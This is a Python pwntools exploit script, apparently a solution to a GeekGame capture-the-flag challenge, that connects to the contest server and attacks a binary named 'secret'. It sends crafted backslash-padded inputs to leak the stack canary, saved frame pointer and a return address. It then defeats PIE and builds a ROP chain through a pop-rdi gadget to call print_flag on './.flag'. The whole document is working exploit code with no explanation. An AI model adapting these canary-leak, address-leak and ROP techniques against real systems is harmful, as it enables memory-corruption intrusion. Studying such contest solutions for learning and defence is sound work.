from pwn import *
import binascii, os

token = os.getenv("TOKEN")

conn = remote("prob12.geekgame.pku.edu.cn", 10012)
conn.recvuntil("token:")
conn.sendline(token)

elf = ELF("./secret")
# conn = process(["./secret"])

def readcid(delta=0, as_bytes=False, output=False):
    data = conn.recvuntil("Case #")
    if output:
        try:
            print(data.decode("utf-8"))
        except:
            pass
    cid = int(conn.recvline().rstrip(b":\n")) + delta
    cid = (cid + (1 << 32)) % (1 << 32)
    if as_bytes:
        cid = struct.pack("<I", cid)
    if output:
        print("cid", cid)
    return cid

def shift4():
    payload = '\\' * 128
    conn.sendline(payload)
    readcid()
    payload = '\\' * 2 + 'A' * 41 + 'ZZ'
    payload += '\\\\\\\\\\\\\\' * 4
    payload += '\\'
    conn.sendline(payload)
    readcid()
    payload = '\\' * 128
    conn.sendline(payload)
    readcid()

def shift2():
    payload = '\\' * 128
    conn.sendline(payload)
    readcid()
    payload = '\\' * 2 + 'A' * 41 + 'ZZ'
    payload += '\\\\\\' * 4
    payload += '\\'
    conn.sendline(payload)
    readcid()
    payload = '\\' * 128
    conn.sendline(payload)
    readcid()

def shift1():
    payload = '\\' * 128
    conn.sendline(payload)
    readcid()
    payload = '\\' * 2 + 'A' * 41 + 'ZZ'
    payload += '\\' * 4
    payload += '\\'
    conn.sendline(payload)
    readcid()
    payload = '\\' * 128
    conn.sendline(payload)
    ret = readcid(as_bytes=True)
    return ret[2:]

def get_canary_rbp():
    shift4()
    shift2()
    ALL = b""
    ALL += shift1()
    ALL += shift1()
    ALL += shift1()
    ALL += shift1()
    ALL += shift1()
    ALL += shift1()
    ALL += shift1()
    canary = b"\x00" + ALL[:7]
    rbp = ALL[7:].ljust(8, b'\x00')

    return canary, rbp

def shift5():
    payload = '\\' * 128
    conn.sendline(payload)
    readcid()
    payload = 'A' * 46 + 'ZZZZZZ'
    payload += '\\\\\\\\\\\\\\\\\\' * 4
    payload += '\\'
    conn.sendline(payload)
    readcid()
    payload = '\\' * 128
    conn.sendline(payload)
    readcid()

def shift7():
    payload = '\\' * 128
    conn.sendline(payload)
    readcid()
    payload = 'A' * 46
    payload += '\\\\\\\\\\\\\\\\\\\\\\\\\\' * 4
    payload += '\\'
    conn.sendline(payload)
    readcid()
    payload = '\\' * 128
    conn.sendline(payload)
    readcid()

def shift5_2():
    payload = '\\' * 128
    conn.sendline(payload)
    readcid()
    payload = 'A' * 44
    payload += '\\\\\\\\\\\\\\\\\\' * 4
    payload += '\\'
    conn.sendline(payload)
    readcid()
    payload = '\\' * 128
    conn.sendline(payload)
    readcid()

def get_address(first_byte):
    ALL = b""
    shift5()
    shift7()
    shift5_2()
    shift2()
    shift2()
    ALL += shift1()
    ALL += shift1()
    ALL += shift1()
    ALL = first_byte + ALL
    return ALL[:6].ljust(8, b'\x00')

def send_msg_0(data):
    assert len(data) % 3 == 0
    assert 9 <= len(data) <= 60
    assert b'\\' not in data
    assert b'\x00' not in data
    offset = 41 - (len(data) - 9) // 3
    payload = b'\\' * 128
    conn.sendline(payload)
    readcid()
    payload = b'\\' + b'A' * (offset - 1)
    payload += data
    payload += b'\\'
    conn.sendline(payload)
    readcid()

def send_msg_1(data):
    assert len(data) % 3 == 1
    assert 10 <= len(data) <= 60
    assert b'\\' not in data
    assert b'\x00' not in data
    offset = 42 - (len(data) - 10) // 3
    payload = b'\\' * 128
    conn.sendline(payload)
    readcid()
    payload = b'\\A\\' + b'A' * (offset - 3)
    payload += data
    payload += b'\\'
    conn.sendline(payload)
    readcid()

def send_msg_2(data):
    assert len(data) % 3 == 2
    assert 8 <= len(data) <= 60
    assert b'\\' not in data
    assert b'\x00' not in data
    offset = 40 - (len(data) - 8) // 3
    payload = b'\\' * 128
    conn.sendline(payload)
    readcid()
    payload = b'A' * offset
    payload += data
    payload += b'\\'
    conn.sendline(payload)
    readcid()

def send_msg(data):
    if len(data) % 3 == 0:
        send_msg_0(data)
    if len(data) % 3 == 1:
        send_msg_1(data)
    if len(data) % 3 == 2:
        send_msg_2(data)

def main():
    readcid()
    canary, rbp = get_canary_rbp()
    return_address = elf.symbols['main'] + 25
    lowest_byte = (return_address & 0xff).to_bytes(1, "big")
    address = get_address(lowest_byte)
    address = struct.unpack("<Q", address)[0]
    text_base = address - return_address
    print_flag = text_base + elf.symbols['print_flag']
    rop = ROP([elf])
    rop = rop.search(regs=['rdi'], order='regs')
    pop_rdi = text_base + rop.address
    rsp = struct.unpack("<Q", rbp)[0] - 32 - 0x140

    payload = b"".join([
        b"\xff" * 8,
        canary,
        b"\xff" * 8,
        p64(pop_rdi),
        p64(rsp + 0x160),
        p64(print_flag),
        b"./.flag",
    ])

    size = []
    prefix = 0

    for idx, data in enumerate(payload.split(b"\x00")):
        size.append(prefix)
        prefix += len(data) + 1

    for idx, data in enumerate(payload.split(b"\x00")[::-1]):
        print("sending", data)
        data = b"\xee" * size[-idx - 1] + data
        send_msg(data)

    conn.sendline("exit")
    print(conn.recvall())

main()